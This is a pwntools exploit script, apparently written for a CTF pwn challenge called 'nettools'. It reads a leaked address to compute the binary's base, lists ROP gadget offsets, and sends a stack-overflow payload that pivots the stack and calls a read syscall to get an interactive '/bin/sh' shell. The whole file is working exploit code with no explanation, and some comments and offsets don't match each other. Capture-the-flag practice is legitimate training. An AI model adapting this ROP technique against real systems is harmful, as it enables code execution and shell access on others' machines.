from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('nettools')
r= e.process(env={"RUST_BACKTRACE":"1"})
# r = remote('challs.n00bzunit3d.xyz', 42450)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

r.recvuntil(b"leaked: 0x")
base= int(r.recv(12),16)-0x7a03c
ret =0x000000000000901a+base

# binsh =leak+0x2020
main=0xe0a0+base
syscall =0x0000000000025adf+base
pop_rdi =0x000000000000a0ef+base
pop_rax =0x000000000000ecaa+base
pop_rsi =0x0000000000009c18+base
mov_rdx_rsi =0x000000000005f28e+base
mov_rax_r8 =0x000000000005de4c+base
pop_rbp=0x00000000000097b3+base
# 0x000000000000a4e8 : pop rcx ; ret
pop_rcx=0x000000000000a4e8+base
mov_rsi_rax= 0x000000000005ed67+base
leave_ret =0x000000000005f308+base
# 0x000000000005ed67 : mov rsi, rax ; jmp rcx
heap = base +0x7b000
binsh_= 0x7f0bb0+base
# 0x000000000000e044 : add rsp, 0x278 ; ret
add_rsp_x18= 0x0000000000009a5a+base
# 0x0000000000010fdf : add rsp, 0x20 ; ret
add_rsp_x20=0x0000000000010fdf+base
# 0x000000000005de4c : mov rax, r8 ; ret
read3= 0xd480+base
# 0x55fabfbef52c <nettools::ip_lookup+172>
callread=0xd52c+base
print(hex(base))

r.sendlineafter(b"> ", b"3")

pause()

payload = b"/bin/sh\x00"*50+p64(ret)*51+flat(pop_rbp,base+0x7a500, ret,ret,ret,ret)

payload+= flat(pop_rsi,0x200,mov_rdx_rsi, pop_rsi , base+0x7a500, pop_rdi, 0, pop_rax, 0, syscall,ret,ret) 
r.sendline(payload)

payload+= b"/bin/sh\x00"*50 +p64(ret)*51+ flat(leave_ret,pop_rbp,base+0x7a500,ret,0xdeadbeef )

pause()
r.sendline(payload)

r.interactive()
